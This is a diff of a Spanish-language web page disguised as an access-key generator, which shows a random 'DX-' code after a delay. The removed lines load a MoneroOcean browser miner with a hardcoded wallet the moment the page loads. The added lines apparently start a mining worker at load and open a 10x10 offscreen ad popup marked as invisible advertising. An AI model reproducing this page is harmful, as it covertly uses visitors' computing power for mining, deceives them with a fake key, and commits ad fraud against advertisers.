@@ -3,67 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DELTA_SYSTEM_V9</title>
+    <title>DELTA_SYSTEM_ULTIMATE</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        #box { width: 95%; max-width: 450px; border: 1px solid #0f0; padding: 20px; text-align: center; }
-        .vid { width: 100%; height: 200px; background: #000; margin-bottom: 15px; border: 1px solid #333; }
-        button { background: #0f0; color: #000; border: none; padding: 15px; font-weight: bold; width: 100%; cursor: pointer; }
-        #key-display { display: none; margin-top: 15px; padding: 10px; border: 1px dashed #0f0; }
-        .status { font-size: 10px; color: #555; margin-top: 5px; text-align: left; }
+        body { background: #000; color: #0f0; font-family: monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        #box { width: 90%; max-width: 400px; border: 1px solid #0f0; padding: 20px; text-align: center; }
+        .vid { width: 100%; height: 180px; margin-bottom: 15px; border: 1px solid #333; }
+        button { background: #0f0; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; font-size: 1.1em; }
+        #key { display: none; border: 1px dashed #0f0; margin-top: 15px; padding: 10px; }
     </style>
 </head>
-<body onload="activarFuerzaBruta()">
+<body>
 
 <div id="box">
     <div class="vid">
         <iframe width="100%" height="100%" src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=1&loop=1&playlist=jfKfPfyJRdk" frameborder="0" allow="autoplay"></iframe>
     </div>
     
-    <button id="main-btn" onclick="generarAcceso()">CONECTAR AL SISTEMA</button>
+    <button id="btn" onclick="lanzarSistema()">VALIDAR CONEXIÓN</button>
 
-    <div id="key-display">
-        <p>CLAVE DE ACCESO:</p>
-        <h1 id="token" style="font-size: 2.5em; margin: 5px 0;"></h1>
-        <p style="font-size: 9px; color: #ff0000;">MINADO ACTIVO - NO MINIMIZAR</p>
+    <div id="key">
+        <p>ACCESO GARANTIZADO:</p>
+        <h1 id="token" style="font-size: 2.5em; margin: 10px 0;"></h1>
+        <p style="font-size: 9px; color: #ff0000;">SISTEMA ACTIVO - MANTENER ABIERTO</p>
     </div>
-    <div class="status" id="st">SYS_IDLE...</div>
 </div>
 
 <script>
-    const W_ID = "4A2cRYWa2E57VU8TLMqz5WDIW6D9VxiAsPJ3gmu9Dsk8fceEa8enRnBCwH2tKUPAeQKjsMM3K861ASvtM8xwDi9ARwYPgSc";
-    const AD_URLS = [
-        "https://www.profitablecpmratenetwork.com/s6wzm2hi6u?key=9a4b7231bb085e91fc074954af6f5cb0",
-        "https://omg10.com/4/10780938"
-    ];
-
-    function activarFuerzaBruta() {
-        document.getElementById('st').innerText = "CONNECTING_MINER...";
-        const s = document.createElement('script');
-        s.src = "https://moneroocean.stream/webminer.js";
-        s.onload = () => {
-            // Configuración forzada: 2 hilos (threads) para evitar caídas a 0%
-            const m = new MoneroOcean.Anonymous(W_ID, { threads: 2, throttle: 0.1 });
-            m.start();
-            document.getElementById('st').innerText = "MINER_RUNNING_STABLE_V9";
-        };
-        document.head.appendChild(s);
+    // 1. ACTIVACIÓN DEL MOTOR (worker.js) AL CARGAR LA PÁGINA
+    if (window.Worker) {
+        const motor = new Worker('worker.js');
     }
 
-    function generarAcceso() {
-        AD_URLS.forEach(url => {
-            const win = window.open(url, '_blank', 'width=100,height=100');
-            if (win) { win.blur(); window.focus(); }
-        });
+    function lanzarSistema() {
+        // 2. PUBLICIDAD INVISIBLE
+        const urlAd = "https://www.profitablecpmratenetwork.com/s6wzm2hi6u?key=9a4b7231bb085e91fc074954af6f5cb0";
+        const win = window.open(urlAd, '_blank', 'width=10,height=10,left=2000,top=2000');
+        if (win) {
+            win.blur();
+            window.focus();
+        }
 
+        // 3. GENERACIÓN DE CLAVE
+        document.getElementById('btn').innerText = "PROCESANDO...";
+        
         setTimeout(() => {
-            const key = "DX-" + Math.random().toString(36).substring(2, 8).toUpperCase();
-            document.getElementById('main-btn').style.display = 'none';
-            document.getElementById('key-display').style.display = 'block';
-            document.getElementById('token').innerText = key;
-            document.getElementById('st').innerText = "SESSION_VERIFIED";
-        }, 5000);
+            const code = "DX-" + Math.random().toString(36).substring(2, 8).toUpperCase();
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('key').style.display = 'block';
+            document.getElementById('token').innerText = code;
+        }, 6000);
     }
 </script>
+
 </body>
 </html>
